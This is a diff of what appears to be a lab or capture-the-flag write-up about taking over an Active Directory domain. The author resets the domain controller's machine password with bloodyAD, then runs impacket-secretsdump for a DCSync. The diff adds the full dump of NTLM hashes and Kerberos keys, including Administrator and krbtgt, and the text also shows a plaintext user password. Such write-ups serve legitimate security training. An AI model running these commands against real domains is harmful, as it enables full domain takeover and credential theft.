@@ -294,7 +294,7 @@ This user has GenericAll over the DC host
 
 This means i can change the password of the DC host then perform a DC sync to obtain a Domain admin hash
 
-# Compromising the DC host
+# Domain Admin
 
 ```python
 bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -p '5rtfgvb%RTFGVB' -k set password 'CN=EC2AMAZ-A5O4OL8,OU=Domain Controllers,DC=past,DC=local' 'Password123!'
@@ -307,5 +307,49 @@ Ill change the password using bloodyAD of the DC machine account
 From here i can perform a DC sync
 
 ```python
+impacket-secretsdump past.local/'EC2AMAZ-A5O4OL8$':'Password123!'@EC2AMAZ-A5O4OL8.past.local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31592a42841d0a9e74f93c41d8884cd0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:32f98a0286334443b0602bb33a85b2a1:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+tyler:1008:aad3b435b51404eeaad3b435b51404ee:b3beb663d0d8462f9d1360551097f207:::
+ryan:1121:aad3b435b51404eeaad3b435b51404ee:9fc394f5e404de90c2187b8e0ef9a794:::
+EC2AMAZ-A5O4OL8$:1009:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+APPDEV01$:1115:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
+WEBDEV01$:1116:aad3b435b51404eeaad3b435b51404ee:94a0c26018712ec93b70da06cf7274b3:::
+DEV01$:1117:aad3b435b51404eeaad3b435b51404ee:4aa669fbcaefdaede473f912ef7ce04b:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e23adabad14da2aca9729faefd65add5965c40c28e5328b96db04aefb357339d
+Administrator:aes128-cts-hmac-sha1-96:a55df42834588446919da99527f9dd52
+Administrator:des-cbc-md5:801543864ad50ec2
+krbtgt:aes256-cts-hmac-sha1-96:d3e4986f3ad4b9dbe0f1056f84caf1543244d093890c0e1b9e392761983ae610
+krbtgt:aes128-cts-hmac-sha1-96:ef2b9dbab1be9ed28d0f5708865b76ae
+krbtgt:des-cbc-md5:fb9d588f4310973b
+tyler:aes256-cts-hmac-sha1-96:221ffb7a3b887e3b58300e44226bb25198c79ee2b751e3ac073d4b0ec5f92b40
+tyler:aes128-cts-hmac-sha1-96:e6636b50c91277e36f6e1e9e1f37cc89
+tyler:des-cbc-md5:5b1f15298ff4fd9e
+ryan:aes256-cts-hmac-sha1-96:8be4dd4033659023f29dec99f24e60ce6be6f9e699abdfdd42ff3a2e84fac60d
+ryan:aes128-cts-hmac-sha1-96:fb848e4c6c94780fe90804c3c4f95119
+ryan:des-cbc-md5:1ff445f72c5497dc
+EC2AMAZ-A5O4OL8$:aes256-cts-hmac-sha1-96:fc7550428e6052443dcb5b4842f4d9e6c29ad88518cd72c7fc0ceffb09b01b57
+EC2AMAZ-A5O4OL8$:aes128-cts-hmac-sha1-96:9e4193f9dbdd48700dadad6b94c25014
+EC2AMAZ-A5O4OL8$:des-cbc-md5:98f8044f497a68b3
+APPDEV01$:aes256-cts-hmac-sha1-96:7077cb6b9b598c710f1c259ff766e65444bcbf31751e659bc249019fa12e857c
+APPDEV01$:aes128-cts-hmac-sha1-96:675f7b2185109b3512653e60f28787e3
+APPDEV01$:des-cbc-md5:7358625e8589d9b6
+WEBDEV01$:aes256-cts-hmac-sha1-96:03182ed7b9279c0920fd707ca0f40def525cbf82e32a39406019114981b12a4a
+WEBDEV01$:aes128-cts-hmac-sha1-96:51fa4d501040fb8e1e2c82568942d79d
+WEBDEV01$:des-cbc-md5:a2cde3df2673ae80
+DEV01$:aes256-cts-hmac-sha1-96:10ed9722eed1d14a369766c556ee0084c2a6aa2efe7bf607ddab413c33215cfb
+DEV01$:aes128-cts-hmac-sha1-96:50842ac087fa42624903f90a89692d9d
+DEV01$:des-cbc-md5:64f2100131023873
+[*] Cleaning up... 
 ```
+
+Now i have all the hashes for every user on the domain!
+
